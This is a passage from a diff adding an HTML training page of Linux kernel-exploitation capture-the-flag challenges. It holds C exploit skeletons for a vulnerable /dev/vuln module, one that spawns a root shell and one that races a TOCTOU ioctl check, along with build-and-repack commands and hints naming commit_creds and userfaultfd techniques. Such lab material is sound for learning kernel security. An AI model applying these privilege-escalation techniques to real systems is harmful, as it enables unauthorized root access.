+#include &lt;stdlib.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;string.h&gt;
+
+unsigned long user_cs, user_ss, user_rflags, user_sp;
+
+void save_state() {
+    __asm__("mov %%cs, %0\n"
+            "mov %%ss, %1\n"
+            "mov %%rsp, %2\n"
+            "pushfq\n"
+            "pop %3\n"
+            : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
+            :: "memory");
+}
+
+void shell() {
+    if (getuid() == 0) {
+        printf("[+] Got root!\n");
+        system("/bin/sh");
+    } else {
+        printf("[-] Exploit failed, uid=%d\n", getuid());
+    }
+}
+
+int main() {
+    save_state();
+
+    int fd = open("/dev/vuln", O_RDWR);
+    if (fd &lt; 0) { perror("open /dev/vuln"); return 1; }
+
+    // TODO: build exploit payload
+
+    // After returning from kernel:
+    shell();
+    return 0;
+}</code></pre>
+<pre><code class="language-bash"># Compile statically for busybox env
+gcc -o exploit exploit.c -static -lpthread
+
+# Copy into rootfs and repack
+cp exploit rootfs/home/user/
+cd rootfs
+find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs_exploit.cpio.gz
+cd ..
+
+# Launch with exploit
+# Modify run.sh to use initramfs_exploit.cpio.gz</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Key steps: (1) extract initramfs, (2) reverse the .ko module to find the bug, (3) extract vmlinux from bzImage for symbols, (4) boot with <code>-s</code> for GDB and <code>nokaslr</code> for development, (5) find <code>commit_creds</code>/<code>prepare_kernel_cred</code> offsets, (6) build exploit statically with musl-gcc, (7) repack initramfs with exploit inside.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 11: Race Condition in Module</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A kernel module has a TOCTOU (time-of-check-time-of-use) race condition in its ioctl handler. It checks permissions, then acts on user-provided data without re-validation. Exploit the race window.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Vulnerable pattern in module:
+// 1. copy_from_user(&amp;req, user_ptr, sizeof(req))  — check req.len
+// 2. if (req.len &gt; MAX_SIZE) return -EINVAL;
+// 3. copy_from_user(kbuf, req.data, req.len)       — use req.len
+// Race: modify req.len in userspace between step 2 and step 3
+
+// Exploit approach: userfaultfd or mmap + thread
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/ioctl.h&gt;
+
+struct request {
+    size_t len;
+    char *data;
+};
+
+volatile int race_won = 0;
+struct request *shared_req;
+
+void *racer(void *arg) {
+    while (!race_won) {
+        shared_req-&gt;len = 64;      // passes check
+        usleep(1);
+        shared_req-&gt;len = 4096;    // overflows buffer
+    }
+    return NULL;
+}
+
+int main() {
+    int fd = open("/dev/vuln", O_RDWR);
+    shared_req = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
+                       MAP_SHARED|MAP_ANONYMOUS, -1, 0);
+    shared_req-&gt;data = /* ... */;
+
+    pthread_t t;
+    pthread_create(&amp;t, NULL, racer, NULL);
+
+    // Spam ioctl — eventually the race hits
+    for (int i = 0; i &lt; 100000; i++) {
+        ioctl(fd, 0x1337, shared_req);
+    }
+    // ...
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The classic approach uses <code>userfaultfd</code> to stall a <code>copy_from_user</code> at a precise point, modify the data, then release it. If userfaultfd is blocked, use <code>FUSE</code> or a thread race with high iteration count. The key is that the kernel reads from userspace twice without re-validating.</p>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</body>
+</html>
